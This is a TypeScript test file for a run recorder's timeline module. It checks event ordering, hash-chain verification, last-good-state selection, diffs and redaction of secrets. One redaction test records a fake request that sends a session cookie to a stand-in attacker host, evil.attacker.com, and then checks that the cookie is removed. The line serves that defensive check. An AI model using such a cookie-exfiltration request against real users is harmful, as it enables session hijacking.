import { test, describe, before, after } from 'node:test';
import * as assert from 'node:assert';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { ChronosTimeline } from '../../src/chronos/timeline.ts';
import { hashSnapshot } from '../../src/chronos/stateHash.ts';
import { RunRecorder } from '../../src/capture/recorder.ts';
import { redactDeep } from '../../src/capture/redact.ts';
import type { EventRecord, StateSnapshot } from '../../src/core/types.ts';

let dir: string;
before(() => { dir = fs.mkdtempSync(path.join(os.tmpdir(), 'parallax-chronos-')); });
after(() => { fs.rmSync(dir, { recursive: true, force: true }); });

function snap(rec: RunRecorder, label: string, s: Partial<StateSnapshot>): EventRecord {
  const snapshot = redactDeep({ step: 1, url: 'http://127.0.0.1:3000/', title: 'Portal', formInputs: {}, timestamp: Date.now(), isHealthy: true, ...s } as StateSnapshot);
  return rec.record('DOM_OBSERVED', 'BROWSER', { kind: 'STATE_SNAPSHOT', label, snapshot, stateHash: hashSnapshot(snapshot), source: 'test' });
}

/** Run with: good step-2 snapshot, failed 400 on step2, failed snapshot. */
function failingRun(runId: string): { rec: RunRecorder; good: EventRecord; failure: EventRecord; failed: EventRecord } {
  const rec = new RunRecorder(runId, dir);
  rec.record('NETWORK_RESPONSE', 'TARGET_APP', { url: 'http://127.0.0.1:3000/api/session', method: 'GET', status: 200 });
  snap(rec, 'step 1', { step: 1, ariaSnapshot: '- heading "Personal details" [ref=e1]' });
  const good = snap(rec, 'step 2 filled', { step: 2, formInputs: { merit_scholarship: 'true', statement_of_purpose: '' }, ariaSnapshot: '- heading "Academic" [ref=e1]\n- checkbox "Merit" [checked] [ref=e2]' });
  rec.record('NETWORK_RESPONSE', 'TARGET_APP', { url: 'http://127.0.0.1:3000/api/apply/step2', method: 'POST', status: 400 });
  const failure = rec.record('FAILURE_DETECTED', 'TARGET_APP', { kind: 'HTTP_ERROR', url: 'http://127.0.0.1:3000/api/apply/step2', path: '/api/apply/step2', method: 'POST', status: 400, error: 'Merit scholarship requires statementOfPurpose to be uploaded.' });
  const failed = snap(rec, 'step 2 rejected', { step: 2, title: 'Portal (error)', isHealthy: false, lastHttpStatusCode: 400, formInputs: { merit_scholarship: 'true', statement_of_purpose: '' }, ariaSnapshot: '- heading "Academic" [ref=e1]\n- checkbox "Merit" [checked] [ref=e2]\n- alert: Merit scholarship requires statementOfPurpose' });
  return { rec, good, failure, failed };
}

describe('CHRONOS ingestion', () => {
  test('orders chronologically and keeps append order for same-millisecond events', () => {
    const base = { runId: 'r', actor: 'BROWSER', payload: {}, hash: 'h' };
    const raw = [
      { ...base, id: 'c', timestamp: 20, type: 'NETWORK_REQUEST' },
      { ...base, id: 'a', timestamp: 10, type: 'NETWORK_REQUEST' },
      { ...base, id: 'b', timestamp: 10, type: 'NETWORK_RESPONSE' }
    ];
    assert.deepStrictEqual(new ChronosTimeline().ingest(raw).events.map((e) => e.id), ['a', 'b', 'c']);
  });

  test('rejects malformed events without crashing and preserves ids', () => {
    const ok = { id: 'ok1', runId: 'r', timestamp: 1, type: 'DOM_OBSERVED', actor: 'BROWSER', payload: {}, hash: 'h' };
    const r = new ChronosTimeline().ingest([null, 42, { id: 'x' }, { ...ok, type: 'EVIL' }, { ...ok, actor: 'ROOT' }, { ...ok, payload: [] }, ok, ok]);
    assert.deepStrictEqual(r.events.map((e) => e.id), ['ok1']);
    assert.strictEqual(r.rejected.length, 7);
    assert.ok(r.rejected.some((x) => x.reason.startsWith('duplicate')));
    assert.doesNotThrow(() => new ChronosTimeline().toTimeline(r.events));
  });

  test('reads a persisted JSONL run, reports bad lines, verifies the P1 hash chain', () => {
    const { rec } = failingRun('run_jsonl');
    const file = path.join(dir, 'run_jsonl.jsonl');
    const good = new ChronosTimeline().readRunFile(file, 'run_jsonl');
    assert.strictEqual(good.events.length, rec.events().length);
    assert.strictEqual(good.chainValid, true);
    fs.appendFileSync(file, '{not json\n');
    const bad = new ChronosTimeline().readRunFile(file, 'run_jsonl');
    assert.strictEqual(bad.events.length, rec.events().length);
    assert.strictEqual(bad.rejected.length, 1);
    assert.strictEqual(bad.chainValid, null);
  });

  test('missing run file is reported, not thrown', () => {
    const r = new ChronosTimeline().readRunFile(path.join(dir, 'nope.jsonl'));
    assert.strictEqual(r.events.length, 0);
    assert.match(r.rejected[0].reason, /not found/);
  });
});

describe('CHRONOS last-good state and diffs', () => {
  test('selects the latest valid snapshot before the failure (not merely the previous event)', () => {
    const { rec, good, failure } = failingRun('run_lg');
    const c = new ChronosTimeline();
    const r = c.lastGoodState(rec.events(), failure);
    assert.strictEqual(r.status, 'FOUND');
    assert.strictEqual(r.status === 'FOUND' && r.record.eventId, good.id);
  });

  test('rejects snapshots taken while an earlier failure was unresolved', () => {
    const rec = new RunRecorder('run_open', dir);
    const early = snap(rec, 'before first failure', {});
    rec.record('FAILURE_DETECTED', 'TARGET_APP', { kind: 'HTTP_ERROR', method: 'POST', path: '/api/a', status: 500 });
    snap(rec, 'looks healthy but failure open', {});
    const second = rec.record('FAILURE_DETECTED', 'TARGET_APP', { kind: 'HTTP_ERROR', method: 'POST', path: '/api/b', status: 400 });
    const r = new ChronosTimeline().lastGoodState(rec.events(), second);
    assert.strictEqual(r.status === 'FOUND' && r.record.eventId, early.id);
    assert.ok(r.reasoning.some((x) => x.includes('still unresolved')));
  });

  test('rejects a tampered snapshot (hash mismatch) and returns UNAVAILABLE when nothing qualifies', () => {
    const rec = new RunRecorder('run_tamper', dir);
    const snapshot: StateSnapshot = { step: 1, url: 'http://127.0.0.1:3000/', title: 'P', formInputs: {}, timestamp: 1, isHealthy: true };
    rec.record('DOM_OBSERVED', 'BROWSER', { kind: 'STATE_SNAPSHOT', label: 'tampered', snapshot, stateHash: 'deadbeef' });
    const f = rec.record('FAILURE_DETECTED', 'TARGET_APP', { kind: 'HTTP_ERROR', status: 401 });
    const r = new ChronosTimeline().lastGoodState(rec.events(), f);
    assert.strictEqual(r.status, 'UNAVAILABLE');
    assert.ok(r.reasoning.some((x) => x.includes('hash')));
  });

  test('diff reports title, aria, validation error and step changes from captured evidence', () => {
    const { rec, failure } = failingRun('run_diff');
    const recon = new ChronosTimeline().reconstruct(rec.events(), failure.id);
    assert.ok(recon.diff);
    const d = recon.diff!;
    assert.strictEqual(d.titleChanged, true);
    assert.ok(d.aria.added.some((l) => l.includes('alert')));
    assert.ok(d.aria.added.every((l) => !l.includes('[ref=')));
    assert.strictEqual(d.validationErrors.length, 1);
    assert.strictEqual(d.healthChanged, true);
    assert.ok(recon.observations.some((o) => o.startsWith('Observed failure')));
    assert.ok(recon.inferences.every((i) => /associated|supports/i.test(i)), 'inferences must be phrased as associations');
  });

  test('auth state change is derived from observed session responses', () => {
    const rec = new RunRecorder('run_auth', dir);
    rec.record('NETWORK_RESPONSE', 'TARGET_APP', { url: 'http://127.0.0.1:3000/api/session', method: 'GET', status: 200 });
    snap(rec, 'good', { step: 3 });
    rec.record('NETWORK_RESPONSE', 'TARGET_APP', { url: 'http://127.0.0.1:3000/api/apply/submit', method: 'POST', status: 401 });
    const f = rec.record('FAILURE_DETECTED', 'TARGET_APP', { kind: 'HTTP_ERROR', method: 'POST', path: '/api/apply/submit', status: 401, error: 'Session has expired' });
    snap(rec, 'failed', { step: 3, isHealthy: false, lastHttpStatusCode: 401 });
    const d = new ChronosTimeline().reconstruct(rec.events(), f.id).diff!;
    assert.deepStrictEqual([d.authState.before, d.authState.after], ['AUTHENTICATED', 'UNAUTHENTICATED']);
  });

  test('missing evidence: no failure or no failed snapshot is handled safely', () => {
    const rec = new RunRecorder('run_none', dir);
    snap(rec, 'only', {});
    const r = new ChronosTimeline().reconstruct(rec.events());
    assert.strictEqual(r.failure, null);
    assert.strictEqual(r.lastGood.status, 'UNAVAILABLE');
    const rec2 = new RunRecorder('run_nofailedsnap', dir);
    snap(rec2, 'good', {});
    const f = rec2.record('FAILURE_DETECTED', 'TARGET_APP', { kind: 'HTTP_ERROR', status: 400 });
    const r2 = new ChronosTimeline().reconstruct(rec2.events(), f.id);
    assert.strictEqual(r2.lastGood.status, 'FOUND');
    assert.strictEqual(r2.failedState, null);
    assert.strictEqual(r2.diff, null);
  });

  test('secrets never appear in timeline, diff or reconstruction output', () => {
    const rec = new RunRecorder('run_secret', dir);
    snap(rec, 'good', { formInputs: { password: 'hunter2', note: 'SES_ACTIVE_98234' } });
    rec.record('NETWORK_REQUEST', 'BROWSER', { url: 'http://evil.attacker.com/?cookie=SES_ACTIVE_98234', authorization: 'Bearer abc' });
    const f = rec.record('FAILURE_DETECTED', 'TARGET_APP', { kind: 'HTTP_ERROR', status: 401, error: 'token SES_ACTIVE_98234 expired' });
    snap(rec, 'failed', { isHealthy: false, formInputs: { password: 'hunter3', note: 'x' } });
    const c = new ChronosTimeline();
    const out = JSON.stringify([rec.events(), c.toTimeline(rec.events()), c.reconstruct(rec.events(), f.id), fs.readFileSync(path.join(dir, 'run_secret.jsonl'), 'utf-8')]);
    for (const secret of ['hunter2', 'hunter3', 'SES_ACTIVE_98234', 'Bearer abc']) assert.ok(!out.includes(secret), `leaked ${secret}`);
  });

  test('timeline categories map to the four dashboard colours', () => {
    const { rec } = failingRun('run_cat');
    rec.record('NETWORK_BLOCKED', 'GUARD', { host: 'evil.attacker.com' });
    rec.record('APPROVAL_REQUESTED', 'GUARD', {});
    const cats = new Set(new ChronosTimeline().toTimeline(rec.events()).map((t) => t.category));
    assert.deepStrictEqual([...cats].sort(), ['AWAITING_APPROVAL', 'FAILURE', 'GUARD_BLOCKED', 'NORMAL']);
  });
});
